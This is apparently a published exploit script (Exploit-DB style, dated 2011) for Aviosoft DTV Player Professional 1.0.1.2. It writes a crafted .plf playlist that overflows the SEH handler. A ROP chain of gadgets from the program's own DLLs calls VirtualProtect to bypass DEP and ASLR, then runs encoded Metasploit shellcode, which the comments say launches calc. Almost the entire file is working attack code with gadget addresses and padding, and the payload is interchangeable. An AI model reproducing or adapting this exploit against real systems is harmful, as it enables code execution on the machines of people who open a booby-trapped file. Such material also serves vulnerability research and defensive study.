# Exploit Title: Aviosoft DTV Player Professional 1.0.1.2 Universal (DEP+ASLR Bypass)
# Author: modpr0be
# Software Download: http://www.aviosoft.com/download.php?product=dtvplayerpro
# Date: 23/09/2011
# PoC: http://www.exploit-db.com/exploits/17745/
# Tested on: Windows XP SP2, Windows XP SP3, Windows 7
# Thanks: corelanc0d3r, cyb3r.anbu, otoy, sickness, 5m7x, loneferret, _sinner, mr_me
# Take a look at mona.py :) awesome tool developed by corelanc0d3r and his team: 
# https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/

#!/usr/bin/python

import struct
file = 'adtv-rop-dep-bypass.plf'

junk = 'A' * 36

#we don't need nseh
seh = struct.pack('<L', 0x6401616b) # ADD ESP,4A0 # RETN 04    ** [MediaPlayerCtrl.dll]

rop = struct.pack('<L', 0x6405347a)	# POP EDX # RETN [MediaPlayerCtrl.dll] 
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x10011108)	# ptr to &VirtualProtect() [IAT SkinScrollBar.Dll]
rop+= struct.pack('<L', 0x64010503) # PUSH EDX # POP EAX # POP ESI # RETN    ** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x6160949f) # MOV ECX,DWORD PTR DS:[EDX] # POP ESI # POP EBP # MOV DWORD PTR DS:[EAX],ECX # POP EBX # RETN 0C    ** [EPG.dll]
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x41414141)	# Filler (compensate)
rop+= struct.pack('<L', 0x61604218) # PUSH ECX # ADD AL,5F # XOR EAX,EAX # POP ESI # RETN 0C    ** [EPG.dll]
rop+= struct.pack('<L', 0x41414141)	# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x41414141)	# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x41414141)	# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x6403d1a6)	# POP EBP # RETN [MediaPlayerCtrl.dll] 
rop+= struct.pack('<L', 0x41414141)	# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x41414141)	# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x41414141)	# Filler (RETN offset compensation)
rop+= struct.pack('<L', 0x60333560)	# & push esp #  ret 0c [Configuration.dll]
rop+= struct.pack('<L', 0x61323EA8) # POP EAX # RETN    ** [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0xA13977DF) # 0x00000343-> ebx
rop+= struct.pack('<L', 0x640203fc) # ADD EAX,5EC68B64 # RETN    ** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0x6163d37b) # PUSH EAX # ADD AL,5E # POP EBX # RETN    ** [EPG.dll]
rop+= struct.pack('<L', 0x61626807) # XOR EAX,EAX # RETN    ** [EPG.dll]
rop+= struct.pack('<L', 0x640203fc) # ADD EAX,5EC68B64 # RETN    ** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0x6405347a) # POP EDX # RETN    ** [MediaPlayerCtrl.dll]
rop+= struct.pack('<L', 0xA13974DC)	# 0x00000040-> edx
rop+= struct.pack('<L', 0x613107fb) # ADD EDX,EAX # MOV EAX,EDX # RETN    ** [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x60326803)	# POP ECX # RETN [Configuration.dll] 
rop+= struct.pack('<L', 0x60350340)	# &Writable location [AviosoftDTV.exe]
rop+= struct.pack('<L', 0x61329e07)	# POP EDI # RETN [DTVDeviceManager.dll] 
rop+= struct.pack('<L', 0x61326003)	# RETN (ROP NOP) [DTVDeviceManager.dll]
rop+= struct.pack('<L', 0x60340178)	# POP EAX # RETN ** [Configuration.dll] 
rop+= struct.pack('<L', 0x90909090)	# nop
rop+= struct.pack('<L', 0x60322e02)	# PUSHAD # RETN [Configuration.dll] 

nop = '\x90' * 32
# ./msfpayload windows/exec CMD=calc R | msfencode -t c -e x86/alpha_mixed -b '\x00\0a\x1a'
# [*] x86/alpha_mixed succeeded with size 454 (iteration=1)
# shellcode length = 454
shellcode = ("\x89\xe5\xd9\xee\xd9\x75\xf4\x5d\x55\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x4b\x4c\x5a\x48\x4e\x69\x47\x70\x45\x50\x43\x30\x43\x50\x4f"
"\x79\x4d\x35\x56\x51\x4e\x32\x43\x54\x4e\x6b\x50\x52\x50\x30"
"\x4e\x6b\x51\x42\x54\x4c\x4c\x4b\x56\x32\x45\x44\x4e\x6b\x52"
"\x52\x51\x38\x54\x4f\x4c\x77\x50\x4a\x45\x76\x56\x51\x49\x6f"
"\x54\x71\x4b\x70\x4c\x6c\x47\x4c\x43\x51\x51\x6c\x45\x52\x56"
"\x4c\x47\x50\x49\x51\x5a\x6f\x54\x4d\x47\x71\x4f\x37\x4d\x32"
"\x5a\x50\x52\x72\x51\x47\x4e\x6b\x50\x52\x54\x50\x4e\x6b\x51"
"\x52\x47\x4c\x43\x31\x5a\x70\x4e\x6b\x51\x50\x51\x68\x4d\x55"
"\x49\x50\x54\x34\x43\x7a\x56\x61\x5a\x70\x52\x70\x4c\x4b\x50"
"\x48\x45\x48\x4c\x4b\x52\x78\x47\x50\x45\x51\x58\x53\x58\x63"
"\x45\x6c\x43\x79\x4c\x4b\x56\x54\x4c\x4b\x56\x61\x5a\x76\x56"
"\x51\x49\x6f\x50\x31\x49\x50\x4c\x6c\x4f\x31\x58\x4f\x56\x6d"
"\x47\x71\x5a\x67\x45\x68\x4b\x50\x50\x75\x58\x74\x47\x73\x51"
"\x6d\x4c\x38\x47\x4b\x43\x4d\x45\x74\x43\x45\x4b\x52\x52\x78"
"\x4e\x6b\x50\x58\x56\x44\x47\x71\x58\x53\x45\x36\x4c\x4b\x56"
"\x6c\x52\x6b\x4c\x4b\x52\x78\x47\x6c\x45\x51\x4e\x33\x4c\x4b"
"\x56\x64\x4c\x4b\x47\x71\x5a\x70\x4b\x39\x52\x64\x51\x34\x47"
"\x54\x43\x6b\x43\x6b\x51\x71\x43\x69\x50\x5a\x50\x51\x49\x6f"
"\x49\x70\x43\x68\x43\x6f\x50\x5a\x4c\x4b\x45\x42\x58\x6b\x4f"
"\x76\x51\x4d\x43\x5a\x45\x51\x4e\x6d\x4b\x35\x4c\x79\x47\x70"
"\x47\x70\x43\x30\x52\x70\x52\x48\x54\x71\x4e\x6b\x50\x6f\x4d"
"\x57\x49\x6f\x4e\x35\x4f\x4b\x4c\x30\x4d\x65\x49\x32\x52\x76"
"\x52\x48\x4e\x46\x4d\x45\x4d\x6d\x4f\x6d\x49\x6f\x58\x55\x45"
"\x6c\x54\x46\x43\x4c\x47\x7a\x4d\x50\x4b\x4b\x4d\x30\x52\x55"
"\x43\x35\x4d\x6b\x43\x77\x56\x73\x51\x62\x52\x4f\x51\x7a\x47"
"\x70\x43\x63\x49\x6f\x5a\x75\x51\x73\x50\x61\x52\x4c\x50\x63"
"\x43\x30\x41\x41")

sisa = 'C' * 4124
junk2 = 'B' * (872 - len(rop+junk+nop+shellcode))

payload = junk+rop+nop+shellcode+junk2+seh+sisa

f = open(file,'w')
print "Payload size: ", len(payload)
f.write(payload)
print "File",file, "successfully created"
f.close()